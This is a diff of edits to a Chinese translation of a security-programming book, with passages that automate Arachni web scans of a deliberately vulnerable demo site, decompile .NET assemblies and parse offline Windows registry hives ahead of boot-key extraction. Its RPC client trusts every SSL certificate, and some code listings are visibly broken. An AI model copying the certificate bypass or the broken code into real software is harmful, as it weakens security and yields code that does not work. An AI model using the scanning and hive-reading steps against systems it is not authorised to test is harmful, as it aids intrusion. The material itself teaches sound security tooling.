 
 ## 创建 ArachniHTTPManager 类
 
-ArachniHTTPManager 类此时看起来也应该简单，如列表 12-5 所示。
+`ArachniHTTPManager` 类此时看起来也应该简单，如列表 12-5 所示。
 
 ```csharp
 public class ArachniHTTPManager {
@@ -7093,49 +7162,67 @@ public static void Main(string[] args) {
 }
 ```
 
-列表 12-6: 使用 ArachniHTTPSession 和 ArachniHTTPManager 驱动 Arachni
-
-
-
-
+列表 12-6: 使用 `ArachniHTTPSession` 和 `ArachniHTTPManager` 驱动 Arachni
 
 网站：http://arachni-scanner.com
+
 文档：http://arachni-scanner.com/wiki
+
 检测到约 10 个问题。
 
-+   [+] 1 | http://demo.testfire.net/search.aspx 脚本上下文中的输入 'txtSearch' (使用 GET) 存在跨脚本攻击 (XSS)。
-+ [+] 2 | http://demo.testfire.net/search.aspx 中的表单输入 'txtSearch' (使用 GET) 存在跨脚本攻击 (XSS)。
++   [+] 1 | http://demo.testfire.net/search.aspx 脚本上下文中的输入 `txtSearch` (使用 GET) 存在跨脚本攻击 (XSS)。
+
++ [+] 2 | http://demo.testfire.net/search.aspx 中的表单输入 `txtSearch` (使用 GET) 存在跨脚本攻击 (XSS)。
+
 + [+] 3 | http://demo.testfire.net/PR/ 存在常见目录。
+
 + [+] 4 | 节点上的 http://demo.testfire.net/default.exe 存在备份文件。
-+ [+] 5 | 节点上的 http://demo.testfire.net/default.aspx 缺少 'X-Frame-Options' 响应头。
+
++ [+] 5 | 节点上的 http://demo.testfire.net/default.aspx 缺少 `X-Frame-Options` 响应头。
+
 + [+] 6 | 节点上的 http://demo.testfire.net/admin.aspx 存在常见管理界面。
+
 + [+] 7 | 节点上的 http://demo.testfire.net/admin.htm 存在常见管理界面。
+
 + [+] 8 | 节点上的 http://demo.testfire.net/default.aspx 存在有趣的响应。
-+ [+] 9 | http://demo.testfire.net/default.aspx 中的 cookie (输入 amSessionId) 缺少 HTTPOnly 。
+
++ [+] 9 | http://demo.testfire.net/default.aspx 中的 cookie (输入 `amSessionId`) 缺少 HTTPOnly 。
+
 + [+] 10 | 节点上的 http://demo.testfire.net/default.aspx 允许的 HTTP 方法。
 
 +   [~] 状态：扫描中
+
 [~] 已发现 3 个页面
 
 +   [~] 已发送 1251 个请求。
+
 [~] 已接收并分析了 1248 个响应。
+
 [~] 耗时 000045
+
 [~] 平均: 39.732270014467 请求/秒。
 
 +   [~] 正在审计 http://demo.testfire.net/default.aspx
+
 [~] 突发响应时间 72.511066 秒
+
 [~] 突发响应总数 97
+
 [~] 突发平均响应时间 0.747536762886598 秒
+
 [~] 突发平均 20.086991167522193 请求/秒
+
 [~] 超时请求 0
+
 [~] 原始最大并发 20
+
 [~] 限制最大并发 20
 
-> (Ctrl+C 取消扫描并获取报告) 列表 12-9: arachni_rpc 命令行扫描
+> (Ctrl+C 取消扫描并获取报告) 列表 12-9: `arachni_rpc` 命令行扫描
 
-# ArachniRPCSession 类
+## ArachniRPCSession 类
 
-要使用 RPC框架和 C# 扫描，我们将再次实现会话/管理器模式，从 Arachni RPC 会话类开始。通过 RPC框架，你将更深入地接触需要处理的实际架构，需要在粒度上处理分发器（dispatchers）和实例（instances）。当你第一次连接到 RPC框架时，你会连接到一个分发器。你可以与此分发器交互以创建并实例化，由它们执行实际的扫描和工作，但这些扫描实例动态地监听与分发器不同的端口。为了给分发器和实例提供易于使用的接口，我们可以创建一个会话构造函数，允许我们稍微忽略这些区别，如列表 12-10 所示。
+要使用 RPC 框架和 C# 扫描，我们将再次实现会话/管理器模式，从 Arachni RPC 会话类开始。通过 RPC 框架，你将更深入地接触需要处理的实际架构，需要在粒度上处理分发器（dispatchers）和实例（instances）。当你第一次连接到 RPC 框架时，你会连接到一个分发器。你可以与此分发器交互以创建并实例化，由它们执行实际的扫描和工作，但这些扫描实例动态地监听与分发器不同的端口。为了给分发器和实例提供易于使用的接口，我们可以创建一个会话构造函数，允许我们稍微忽略这些区别，如列表 12-10 所示。
 
 ```csharp
 public class ArachniRPCSession : IDisposable
@@ -7159,9 +7246,11 @@ public class ArachniRPCSession : IDisposable
 }
 ```
 
-构造函数接受三个参数。前两个——要连接的主机（host）和主机上的端口（port）。第三个是可选的（默认值为 false），允许程序员自动创建一个新的会话实例并连接到它，而不是必须通过分发器手动创建新实例。
+构造函数接受三个参数。前两个——要连接的主机（host）和主机上的端口（port）。第三个是可选的（默认值为 `false`），允许程序员自动创建一个新的会话实例并连接到它，而不是必须通过分发器手动创建新实例。
 
-在分别为构造函数的 Host 和 Port 属性赋值后，我们使用 GetStream() 连接到分发器。如果第三个参数传递了 true 值，实例化 instantiateInstance（默认认为 false），我们将使用 Guid 为想要分发的实例创建一个唯一名称，然后运行分发器.dispatch RPC 命令创建一个新的会话，该会话返回一个新的端口（如果你有会话实例集群，则可能返回新主机）。列表 12-11 显示了构造函数的结果。
+在分别为构造函数的 `Host` 和 `Port` 属性赋值后，我们使用 `GetStream()` 连接到分发器。如果第三个参数传递了 `true` 值，实例化 `instantiateInstance`（默认认为 `false`），我们将使用 `Guid` 为想要分发的实例创建一个唯一名称，然后运行 `dispatcher.dispatch` RPC 命令创建一个新的会话，该会话返回一个新的端口（如果你有会话实例集群，则可能返回新主机）。列表 12-11 显示了构造函数的结果。
+
+
 
 ```csharp
 string[] url = resp.AsString("url").Split(';');
@@ -7190,13 +7279,16 @@ public string InstanceHost { get; set; }
 public int InstancePort { get; set; }
 public string InstanceName { get; set; }
 ```
+
 *Listing 12-10: ArachniRPCSession 构造函数的后半部分及其属性*
 
-在 ①，我们将扫描器 URL（例如 127.0.0.1:7331）拆分为 IP 地址和端口（分别为 127.0.0.1 和 7331）。一旦有了用于驱动实际扫描的主机和端口，我们将它们分别赋值给 InstanceHost 和 InstancePort 属性。我们还会保存分发器返回的令牌，以便以后进行 RPC 调用。当 Arachni 分发新实例时会自动生成此令牌，以便可以使用它。我们使用 GetStream() ③ 连接到扫描器，这提供了对实例访问。如果连接成功且扫描活跃 ④，我们将 InstanceStream 属性设置为 true，以便知道我们是在驱动分发器还是实例（RPC 调用到 Arachni，例如在实现 ArachRPCManager 类时）。在构造函数之后，我们为会话定义了属性 ⑤，这些属性都用于构造函数。
+在 ①，我们将扫描器 URL（例如 `127.0.0.1:7331`）拆分为 IP 地址和端口（分别为 `127.0.0.1` 和 `7331`）。一旦有了用于驱动实际扫描的主机和端口，我们将它们分别赋值给 `InstanceHost` 和 `InstancePort` 属性。我们还会保存分发器返回的令牌，以便以后进行 RPC 调用。当 Arachni 分发新实例时会自动生成此令牌，以便可以使用它。
 
-# ExecuteCommand 的支持方法
+我们使用 `GetStream()` ③ 连接到扫描器，这提供了对实例访问。如果连接成功且扫描活跃 ④，我们将 `InstanceStream` 属性设置为 `true`，以便知道我们是在驱动分发器还是实例（RPC 调用到 Arachni，例如在实现 `ArachRPCManager` 类时）。在构造函数之后，我们为会话定义了属性 ⑤，这些属性都用于构造函数。
 
-在实现 ExecuteCommand() 之前，我们需要为 ExecuteCommand() 实现支持方法。我们快要成功了！列表 12-12 显示了完成 ArachniRPCSession 类所需的方法。
+# `ExecuteCommand()` 的支持方法
+
+在实现 `ExecuteCommand()` 之前，我们需要为 `ExecuteCommand()` 实现支持方法。我们快要成功了！列表 12-12 显示了完成 `ArachniRPCSession` 类所需的方法。
 
 ```csharp
 public byte[] DecompressData(byte[] inData)
@@ -7253,15 +7345,20 @@ public void Dispose()
   _stream = null;
 }
 ```
-Listing 12-12: ArachniRPCSession 支持方法
 
-RPC 会话类的支持方法大部分都很。DecompressData() 方法从 NuGet 可用的 zlib 库创建一个输出流，称为 ZOutputStream ① 它将压缩后的数据作为字节数组返回。在 ReadMessage() 方法 ②，我们从流中读取前 4 个字节并转换为 32 位无符号整数 ③ 表示剩余数据的长度。一旦获取了长度，我们就从流中读取数据并作为字节数组返回。
+Listing 12-12: `ArachniRPCSession` 支持方法
 
-GetStream() 方法 ④ 也与我们在 OpenVAS 库中创建网络流的代码非常。我们创建一个新的 TcpClient 并将其封装在 SslStream 中。我们使用 ValidateServerCertificate 方法 ⑤ 返回 true 来信任所有 SSL 证书。这允许我们连接到带有自签名证书的 RPC 实例。最后，⑥ 是 ArachniRPCSession 实现的 IDisposable 接口。如果我们驱动的是实例而不是分发器（在创建 ArachniRPCSession 时在构造函数设置设置），发送 instance shutdown 命令 ⑦ 来清理实例但保持分发器运行。
+RPC 会话类的支持方法大部分都很。`DecompressData()` 方法从 NuGet 可用的 zlib 库创建一个输出流，称为 `ZOutputStream` ①。它将压缩后的数据作为字节数组返回。
 
-## ExecuteCommand() 方法
+在 `ReadMessage()` 方法 ② 中，我们从流中读取前 4 个字节并转换为 32 位无符号整数 ③，表示剩余数据的长度。一旦获取了长度，我们就从流中读取数据并作为字节数组返回。
 
-列表 12-13 显示的 ExecuteCommand() 方法封装了从 Arachni RPC 发命令和接收响应所需的功能。
+`GetStream()` 方法 ④ 也与我们在 OpenVAS 库中创建网络流的代码非常。我们创建一个新的 `TcpClient` 并将其封装在 `SslStream` 中。我们使用 `ValidateServerCertificate` 方法 ⑤ 返回 `true` 来信任所有 SSL 证书。这允许我们连接到带有自签名证书的 RPC 实例。
+
+最后，⑥ 是 `ArachniRPCSession` 实现的 `IDisposable` 接口。如果我们驱动的是实例而不是分发器（在创建 `ArachniRPCSession` 时在构造函数设置设置），发送 `instance shutdown` 命令 ⑦ 来清理实例但保持分发器运行。
+
+## `ExecuteCommand()` 方法
+
+列表 12-13 显示的 `ExecuteCommand()` 方法封装了从 Arachni RPC 发命令和接收响应所需的功能。
 
 ```csharp
 public MessagePackObject ExecuteCommand(string command, object[] args,
@@ -7284,19 +7381,20 @@ string token = null)
     }
 }
 ```
-ArachniRPCSession 类中的 ExecuteCommand() 方法
-ExecuteCommand() 方法 ⑧ 接受三个参数：要执行的命令、使用的参数对象、如果提供了身份验证令牌，则作为 token 的参数。该方法以后主要由 ArachRPCManager 类使用。我们通过创建一个名为 request 的新字典来开始方法，存储我们的命令数据（运行的命令和 RPC 命令的参数）⑨。然后我们将字典中的 message Key ⑩ 赋值为传递给方法的第一个参数
 
-> 列表 12-13: ExecuteCommand() 方法的前半部分
+`ArachniRPCSession` 类中的 `ExecuteCommand()` 方法
 
+`ExecuteCommand()` 方法 ⑧ 接受三个参数：要执行的命令、使用的参数对象、如果提供了身份验证令牌，则作为 `token` 的参数。该方法以后主要由 `ArachRPCManager` 类使用。
 
+我们通过创建一个名为 `request` 的新字典来开始方法，存储我们的命令数据（运行的命令和 RPC 命令的参数）⑨。然后我们将字典中的 `message` Key ⑩ 赋值为传递给方法的第一个参数。
 
+> 列表 12-13: `ExecuteCommand()` 方法的前半部分
 
 `ExecuteCommand()` 方法是用于运行的命令。我们还在字典中分配了 `args` 键，其值为传递给方法的第二个参数，这些是运行命令的选项。当我们发送消息时，Arachni 会查看这些键，使用给定的参数运行 RPC 命令并返回响应。如果第三个参数（可选）不为空，我们分配传递给方法的 `token`。这三个字典键（`message`、`args` 和 `token`）就是当你将序列化后的数据发送给 Arachni 时它会查看的所有内容。
 
 一旦我们设置了要发送给 Arachni 的请求字典，就会创建一个新的 `MemoryStream`，并使用第 11 节中 Metasploit 绑定中相同的 `Packer` 类将请求字典序列化为字节数组。现在，我们已经准备好了发送给 Arachni 通过 RPC 命令运行的数据，我们需要发送数据并接收来自 Arachni 的响应。这位于 `ExecuteCommand()` 方法的后半部分，如列表 12–14 所示。
 
-```
+```csharp
 byte[] packedLength = if (BitConverter.IsLittleEndian) BitConverter.GetBytes(packedLength);
 Array.Reverse(packedLength);
 stream.Write(packedLength);
@@ -7312,15 +7410,17 @@ try {
 }
 ```
 
-列表 12-14：ArachniRPCSession 类中 `ExecuteCommand()` 方法的后半部分
+列表 12-14：`ArachniRPCSession` 类中 `ExecuteCommand()` 方法的后半部分
 
-由于 Arachni RPC 流使用简单的协议进行通信，我们可以轻松地将 MSGPACK 数据发送给 Arachni，但我们需要向 Arachni 发送两个信息，而是 MSGPACK 数据。我们首先需要在 MSGPACK 数据之前以 4 字节整数的形式向 Arachni 发送 MSGPACK 数据的大小。这个整数是每个消息中序列化数据的长度，它告诉接收主机（在此例中为 Arachni）消息段中读取多少流数据。我们需要获取数据长度的字节，因此使用 `BitConverter.GetBytes()` ① 获取 4 字节数组。数据的长度和数据本身需要按照特定的顺序写入 Arachni 流中。我们将表示长度的 4 个字节写入流 ➁，然后将完整的序列化消息写入流。
+由于 Arachni RPC 流使用简单的协议进行通信，我们可以轻松地将 MSGPACK 数据发送给 Arachni，但我们需要向 Arachni 发送两个信息，而是 MSGPACK 数据。我们首先需要在 MSGPACK 数据之前以 4 字节整数的形式向 Arachni 发送 MSGPACK 数据的大小。这个整数是每个消息中序列化数据的长度，它告诉接收主机（在此例中为 Arachni）消息段中读取多少流数据。
+
+我们需要获取数据长度的字节，因此使用 `BitConverter.GetBytes()` ① 获取 4 字节数组。数据的长度和数据本身需要按照特定的顺序写入 Arachni 流中。我们将表示长度的 4 个字节写入流 ➁，然后将完整的序列化消息写入流。
 
 接下来，我们需要从 Arachni 读取响应并并将响应返回给调用者。使用 `ReadMessage(object)` 方法 ④，我们获取消息的原始字节，并尝试在 `try-catch` 块中将其解包为 `MessagePackObjectDictionary`。如果第一次尝试失败，说明数据使用了 GZip 压缩，因此由 `catch` 块 ➄ 接管。我们解压数据，然后将解压后的字节解包为 `MessagePackObjectDictionary`。最后，我们返回服务器的完整响应，或者如果发生错误则抛出异常。
 
-# ArachniRPCManager 类
+# `ArachniRPCManager` 类
 
-ArachniRPCManager 类比 ArachniRPCSession 类简单得多，如列表 12-15 所示。
+`ArachniRPCManager` 类比 `ArachniRPCSession` 类简单得多，如列表 12-15 所示。
 
 ```csharp
 public class ArachniRPCManager : IDisposable
@@ -7368,15 +7468,19 @@ public class ArachniRPCManager : IDisposable
 }
 ```
 
-列表 12-15：ArachniRPCManager 构造函数接受一个 ArachniPCSession ❶ 作为其唯一参数。
+列表 12-15：`ArachniRPCManager` 构造函数接受一个 `ArachniPCSession` ❶ 作为其唯一参数。
 
-首先，ArachniRPCManager 类将仅实现扫描实例的方法，而不是调度器的方法，因此如果传递的会话不是扫描实例，我们将抛出一个异常。否则，我们将会话分配给本地类变量，供其余方法使用。
+首先，`ArachniRPCManager` 类将仅实现扫描实例的方法，而不是调度器的方法，因此如果传递的会话不是扫描实例，我们将抛出一个异常。否则，我们将会话分配给本地类变量，供其余方法使用。
 
-我们在 ArachniRPCManager 类中创建的第一个方法是 `StartScan()` 方法 ❷，它接受两个参数。第一个参数是 URL。第二个参数是可选的，可以更改以指定不同的检查项，例如 XSS、SQL 注入和路径遍历。我们将在下一节详细讨论 Arachni 如何报告问题。`GetProgress()` 方法 ③ 接受单个参数：Arachni 用于识别问题的整数列表。使用该参数，我们构建一个小型字典并将其传递给进度查询。`service.progress` 命令 ❹ 将返回当前状态。最后一个重要方法 `IsBusy()` ⑤ 仅告诉我们扫描器是否正在执行扫描。最后，我们通过 `Dispose()` ⱱ 进行清理。
+我们在 `ArachniRPCManager` 类中创建的第一个方法是 `StartScan()` 方法 ❷，它接受两个参数。第一个参数是 URL。第二个参数是可选的，可以更改以指定不同的检查项，例如 XSS、SQL 注入和路径遍历。我们将在下一节详细讨论 Arachni 如何报告问题。
+
+`GetProgress()` 方法 ③ 接受单个参数：Arachni 用于识别问题的整数列表。使用该参数，我们构建一个小型字典并将其传递给进度查询。`service.progress` 命令 ❹ 将返回当前状态。最后一个重要方法 `IsBusy()` ⑤ 仅告诉我们扫描器是否正在执行扫描。最后，我们通过 `Dispose()` ⱱ 进行清理。
 
 ## 整合
 
 现在我们有了驱动 Arachni RPC 扫描 URL 的构建块。列表 12-16 显示了如何将所有部分组合在一起。
+
+
 
 ```csharp
 public static void Main(string[] args)
@@ -7410,27 +7514,25 @@ public static void Main(string[] args)
 
 列表 12-16：使用 RPC 类驱动 Arachni
 
-
-
-用于存储 Arachni 报告的 {以及扫描开始的时间，我们开始了一个循环循环 ⑨，该循环将一直持续直到 `isRunning` 为 `false`。在循环内部，我们调用 `GetProgress()` 获取扫描的当前进度；然后我们打印 ⓐ 并存储自调用 `GetProgress()` 之后的任何新问题。最后我们休眠 10 秒，然后调用 `isBusy()`ⓐ。接着我们重新开始整个过程，直到扫描结束。任务完成后，我们打印一个关于扫描耗时的小样本 ⓔ。如果你查看你的自动化工具报告的漏洞（我的截断结果显示在列表 12-17 中），与在本章开头手动执行的原始 Arachni 扫描相比，它们是一致的！
+用于存储 Arachni 报告的 `issues` 以及扫描开始的时间，我们开始了一个循环，该循环将一直持续直到 `isRunning` 为 `false`。在循环内部，我们调用 `GetProgress()` 获取扫描的当前进度；然后我们打印 `issues` 并存储自调用 `GetProgress()` 之后的任何新问题。最后我们休眠 10 秒，然后调用 `isBusy()`。接着我们重新开始整个过程，直到扫描结束。任务完成后，我们打印一个关于扫描耗时的小样本。如果你查看你的自动化工具报告的漏洞（我的截断结果显示在列表 12-17 中），与在本章开头手动执行的原始 Arachni 扫描相比，它们是一致的！
 
 ```
 $ mono /ch12_automating_arachni.exe
 Using instance: 1892413b-7656-4491-bc60-05872396b42f
 Starting scan at: 8:58:12 AM
-Issue: Cross-Site Scripting ⓗ
+Issue: Cross-Site Scripting
 Issue: Common directory
 Issue: Backup file
 Issue: Missing, X-Frame-Options header
 Issue: Interesting response
 Issue: Allowed HTTP methods
 Issue: Interesting response
-Issue: Path Traversal ⓔ
+Issue: Path Traversal
 ```
 
 列表 12-17：运行 Arachni C# 类以对示例 URL 进行扫描和报告
 
-由于我们在启用所有检查的情况下运行 Arachni，该站点将报告许多漏洞！在最初的约 10 行内容中，Arachni 将报告一个 XSS 漏洞 ➀、一个包含潜在敏感信息的备份文件 ➁ 以及一个路径遍历漏洞 ➲。如果你想限制 Arachni 执行的检查以仅进行 XSS 漏洞扫描，你可以向 `StartScan` 传递第二个参数字符串 `x*`（该参数的默认值为 `*`，意味着“所有检查”），这样 Arachni 只检查并报告发现的任何 XSS 漏洞。命令最终看起来像如下代码行：`manager.StartScan("http://demo.testfire.net/default.aspx", "x*");`。Arachni 支持多种检查，包括 SQL 注入和命令注入，鼓励你阅读关于支持检查的文档。
+由于我们在启用所有检查的情况下运行 Arachni，该站点将报告许多漏洞！在最初的约 10 行内容中，Arachni 将报告一个 XSS 漏洞、一个包含潜在敏感信息的备份文件以及一个路径遍历漏洞。如果你想限制 Arachni 执行的检查以仅进行 XSS 漏洞扫描，你可以向 `StartScan` 传递第二个参数字符串 `x*`（该参数的默认值为 `*`，意味着“所有检查”），这样 Arachni 只检查并报告发现的任何 XSS 漏洞。命令最终看起来像如下代码行：`manager.StartScan("http://demo.testfire.net/default.aspx", "x*");`。Arachni 支持多种检查，包括 SQL 注入和命令注入，鼓励你阅读关于支持检查的文档。
 
 ## 结论
 
@@ -7438,7 +7540,7 @@ Arachni 是一个极其强大且多功能的 Web 应用程序扫描器，应该�
 
 我们首先实现了一组简单的类，它们与 Arachni REST API 接口，以便启动、监控和报告扫描。使用我们工具集中的基础 HTTP 库，我们能够轻松构建模块化类来驱动 Arachni。
 
-一旦我们完成了较简单的 REST API，我们就进一步通过 MSPACK RPC 驱动 Arachni。通过使用几个开源的第三方库，我们我们能够利用其一些更强大的功能来驱动 Arachni。我们使用它的分布式模型通过 RPC 分发器创建一个新的扫描实例，然后扫描 URL 并实时报告结果。
+一旦我们完成了较简单的 REST API，我们就进一步通过 MSPACK RPC 驱动 Arachni。通过使用几个开源的第三方库，我们能够利用其一些更强大的功能来驱动 Arachni。我们使用它的分布式模型通过 RPC 分发器创建一个新的扫描实例，然后扫描 URL 并实时报告结果。
 
 使用这些构建块中的任何一个，都可以将 Arachni 集成到任何软件开发生命周期（SDLC）或持续集成系统中，以确保你或你组织正在使用或构建的 Web 应用程序的质量和安全性。
 
@@ -7511,9 +7613,6 @@ public class AssemblyClass
 ```
 
 列表 13-1：C# 反编译器
-
-
-
 
 我们创建了一个 `foreach` 循环来帮助我们完成工作。它会对程序集中的每个类执行这些步骤，并根据当前类的信息创建一个新的 `AssemblyClass`（该定义在 `GenerateAssemblyMethodSource()` 方法下方）。
 
@@ -7592,6 +7691,8 @@ Usage is: monodis --output=[filename] [--filename] [--help] [--mscorlib]
 
 ### $ monodis ICSharpCode.Decompiler.dll | tail -n30 | head -n10
 
+
+
 ```
 IL_000c: call
 IL_000d: call class [mscorlib]System.Collections.Generic.EqualityComparer<1!> class
@@ -7615,10 +7716,7 @@ IL_0028: stloc.3
 IL_0029: ldloc.3
 ```
 
-列表 13-5: ICSharp.Decompiler.dll 的反汇编输出
-
-
-
+列表 13-5: `ICSharp.Decompiler.dll` 的反汇编输出
 
 当发生故障或发现新的恶意软件时，要从“发生了什么？”转向“我们如何修复它？”。
 
@@ -7642,7 +7740,7 @@ Windows NT 注册表是一个信息金库，包含了诸如补丁层级和密码
 
 每个节点键都存储了一些特定的元数据，例如其值键最后被修改的时间和其他系统级信息。所有这些数据的存储方式对计算机读取非常高效——但对人类却不是。在实现我们的库时，我们将跳过一些元数据以使结果更简单，但我会特别指出这些实例。
 
-如你在图 14-1 所示，在注册表头之后，树从根节点键开始。根节点有两个子节点，在示例中我们将它们命名为 Foo 和 Bar。Foo 节点键包含两个值键 Baz 和 Bat，它们的值分别为 true 和 "AHA"。另一方面，Bar 仅有一个子节点 BarBuzz，该节点有一个单一值键。这个注册表单元的示例是非常人为构造且简单的。你机器上的注册表单元要复杂得多，可能有数百万个键！
+如你在图 14-1 所示，在注册表头之后，树从根节点键开始。根节点有两个子节点，在示例中我们将它们命名为 `Foo` 和 `Bar`。`Foo` 节点键包含两个值键 `Baz` 和 `Bat`，它们的值分别为 `true` 和 `"AHA"`。另一方面，`Bar` 仅有一个子节点 `BarBuzz`，该节点有一个单一值键。这个注册表单元的示例是非常人为构造且简单的。你机器上的注册表单元要复杂得多，可能有数百万个键！
 
 ## 获取注册表单元
 
@@ -7690,9 +7788,9 @@ C:\Windows\System32\config
 C:\Windows\System32\config>
 ```
 
-列表 14-2：C:\Windows\System32\config 文件夹中的注册表单元内容
+列表 14-2：`C:\Windows\System32\config` 文件夹中的注册表单元内容
 
-**列表 14-2** 显示了目录中的注册表单元。`SECURITY`、`SOFTWARE` 和系统单元包含最常用的信息。一旦将单元拷贝到你的系统，当你使用 Linux 或 OS 时，可以如列表 14-3 所示轻松验证你已保存了想要读取的注册表单元。
+列表 14-2 显示了目录中的注册表单元。`SECURITY`、`SOFTWARE` 和系统单元包含最常用的信息。一旦将单元拷贝到你的系统，当你使用 Linux 或 OS 时，可以如列表 14-3 所示轻松验证你已保存了想要读取的注册表单元。
 
 ```
 $ system.hive
@@ -7743,11 +7841,11 @@ public class RegistryHive
 }
 ```
 
-列表 14-4：RegistryHive
+列表 14-4：`RegistryHive`
 
 让我们看看魔法首次发生的地方——构造函数。构造函数接受单个参数，即文件系统上注册表单元的文件路径。构造函数使用 `File.Exists()` 检查路径是否存在，如果不存在则抛出异常。
 
-一旦确定文件存在，我们需要确保它是注册表文件。但这并不困难。任何注册表单元的前四个魔术字节应该是 r、e、g 和 f。为了检查我们的文件是否匹配，我们使用 `File.OpenRead()` 打开流。然后通过将文件流传递给 `BinaryReader` 构造函数创建一个新的 `BinaryReader`。我们使用它读取文件的前四个字节并存储在字节数组中。
+一旦确定文件存在，我们需要确保它是注册表文件。但这并不困难。任何注册表单元的前四个魔术字节应该是 `r`、`e`、`g` 和 `f`。为了检查我们的文件是否匹配，我们使用 `File.OpenRead()` 打开流。然后通过将文件流传递给 `BinaryReader` 构造函数创建一个新的 `BinaryReader`。我们使用它读取文件的前四个字节并存储在字节数组中。
 
 如果头部通过，我们将移动注册表头块结束处的根节点键（跳过我们不需要的一些元数据）。在下一节中，我们将创建一个 `NodeKey` 类来处理键，以便通过将 `BinaryReader` 传递给 `NodeKey` 构造函数来读取键，并将新的 `NodeKey` 赋值给 `RootKey` 属性供以后使用。
 
@@ -7760,7 +7858,6 @@ public class NodeKey
 {
     public NodeKey(BinaryReader hive)
 ```
-
 
 ```csharp
 ReadNodeStructure(hive);
@@ -7787,11 +7884,11 @@ public byte[] ClassnameData { get; set; }
 public NodeKey ParentNode { get; set; }
 ```
 
-代码列表 14-5：NodeKey 类的构造函数和属性
+代码列表 14-5：`NodeKey` 类的构造函数和属性
 
-NodeKey 类的构造函数接收一个参数，即用于 hive 的 BinaryReader。构造函数调用了三个方法来读取并解析节点的特定部分，我们将在下来的文中实现这些方法。在构造函数之后，我们定义了几个在三个方法中都会使用的属性。这三个属性特别有用：ChildNodes 和 Timestamp。
+`NodeKey` 类的构造函数接收一个参数，即用于 hive 的 `BinaryReader`。构造函数调用了三个方法来读取并解析节点的特定部分，我们将在下来的文中实现这些方法。在构造函数之后，我们定义了几个在三个方法中都会使用的属性。这三个属性特别有用：`ChildNodes` 和 `Timestamp`。
 
-在 NodeKey 构造函数中调用的第一个方法是 `ReadNodeStructure()`，它从注册表中读取节点数据，但不会读取任何子节点或值。详细信息请见代码列表 14-6。
+在 `NodeKey` 构造函数中调用的第一个方法是 `ReadNodeStructure()`，它从注册表中读取节点数据，但不会读取任何子节点或值。详细信息请见代码列表 14-6。
 
 ```csharp
 {
@@ -7843,15 +7940,17 @@ this.ClassNameData = hive.ReadBytes(this.ClassNameLength);
 }
 ```
 
-代码列表 14-6：NodeKey 类的 ReadNodeStructure() 方法
+代码列表 14-6：`NodeKey` 类的 `ReadNodeStructure()` 方法
 
-使用 `ReadBytes()` 读取节点键的后续四个字节，以检查我们是否处于节点键的开头（注意，这两个字节是我们可以根据需要忽略的垃圾数据；我们只关心前两个字节）。我们通过将这些字节的前两个字节分别与 0x6e 和 0x6b 进行比较比较。我们正在寻找代表 ASCII 字符 n 和 k（代表 node key）的两个十六进制值。注册表单元格中的每个节点键都以这两个字节开头，因此我们可以始终确定正在解析的是预期内容。在确定正在读取一个节点键后，保存我们在文件流中的当前位置，以便我们能够轻松返回。
+使用 `ReadBytes()` 读取节点键的后续四个字节，以检查我们是否处于节点键的开头（注意，这两个字节是我们可以根据需要忽略的垃圾数据；我们只关心前两个字节）。我们通过将这些字节的前两个字节分别与 `0x6e` 和 `0x6b` 进行比较比较。我们正在寻找代表 ASCII 字符 `n` 和 `k`（代表 node key）的两个十六进制值。注册表单元格中的每个节点键都以这两个字节开头，因此我们可以始终确定正在解析的是预期内容。在确定正在读取一个节点键后，保存我们在文件流中的当前位置，以便我们能够轻松返回。
 
-接下来，我们开始为某些 NodeKey 属性赋值，从 `IsRootKey` 和 `Timestamp` 属性开始。注意，每隔几行，我们都会通过位置向前跳过而不读取任何内容。我们正在跳过对我们的目的不需要的元数据部分。
+接下来，我们开始为某些 `NodeKey` 属性赋值，从 `IsRootKey` 和 `Timestamp` 属性开始。注意，每隔几行，我们都会通过位置向前跳过而不读取任何内容。我们正在跳过对我们的目的不需要的元数据部分。
 
 然后，我们使用 `ReadInt32()` 方法读取字节并返回一个整数，这是 C# 中非常实用的功能。它有许多方便的方法可以为你处理字节。如你所见，大多数时候我们将使用 `ReadInt32()` 方法，偶尔我们会使用 `ReadInt16()` 或方法来读取特定类型的整数，例如无符号整数和非常长的整数。
 
-最后，我们读取 NodeKey 的名称并将字符串赋值给 `Name` 属性。我们还读取了类名数据，我们将在稍后转储引导键（boot key）时使用它。
+
+
+最后，我们读取 `NodeKey` 的名称并将字符串赋值给 `Name` 属性。我们还读取了类名数据，我们将在稍后转储引导键（boot key）时使用它。
 
 现在，我们需要实现 `ReadChildrenNodes()` 方法。该方法遍历每个子节点，并将节点添加到 `ChildNodes` 属性中，以便我们稍后进行分析，如代码列表 14-7 所示。
 
@@ -7878,9 +7977,7 @@ private void ReadChildrenNodes(BinaryReader hive)
 }
 ```
 
-代码列表 14-7：ReadChildrenNodes() 方法
-
-
+代码列表 14-7：`ReadChildrenNodes()` 方法
 
 ```c
 {
@@ -7898,7 +7995,7 @@ private void ReadChildrenNodes(BinaryReader hive)
 }
 ```
 
-列表 14-9：NodeKey 类的 ReadChildValues() 方法
+列表 14-9：`NodeKey` 类的 `ReadChildValues()` 方法
 
 在 `ReadChildValues()` 方法中，我们首先实例化一个新的列表来存储 `ValueKeys`，并将其赋值给 `ChildValues` 属性。如果 `ValueListOffset` 不等于 -1（这是一个魔数，表示没有子值），则跳转到 `ValueKey` 列表并开始循环读取每个值，将每个新键添加到 `ChildValues` 属性中，以便稍后访问。
 
@@ -7906,7 +8003,7 @@ private void ReadChildrenNodes(BinaryReader hive)
 
 ## 创建一个存储 Value Keys 的类
 
-`ValueKey` 类比 `NodeKey` 类要简单且短得多。如列表 14-10 所示，`ValueKey` 类的大大部分只是构造函数，尽管它也有几个属性。这是我们开始读取离线配置单元（hive）之前唯一需要实现的所有内容。
+`ValueKey` 类比 `NodeKey` 类要简单且短得多。如列表 14-10 所示，`ValueKey` 类的大部分只是构造函数，尽管它也有几个属性。这是我们开始读取离线配置单元（hive）之前唯一需要实现的所有内容。
 
 ```csharp
 public class ValueKey
@@ -7948,9 +8045,9 @@ public byte[] Data { get; set; }
 public string String { get; set; }
 ```
 
-列表 14-10：ValueKey 类
+列表 14-10：`ValueKey` 类
 
-在构造函数 ① 中，我们读取 ② 前两个字节，并通过将这两个字节与 0x76 和 0x6b 进行比较（正如我们之前做的那样）来确保我们读取的是值键。在这种情况下，我们寻找的是 ASCII 中的 "vk"。我们还读取了名称长度 ③ 和数据长度 ④，并将这些值赋值给它们相应的属性。
+在构造函数 ① 中，我们读取 ② 前两个字节，并通过将这两个字节与 `0x76` 和 `0x6b` 进行比较（正如我们之前做的那样）来确保我们读取的是值键。在这种情况下，我们寻找的是 ASCII 中的 `"vk"`。我们还读取了名称长度 ③ 和数据长度 ④，并将这些值赋值给它们相应的属性。
 
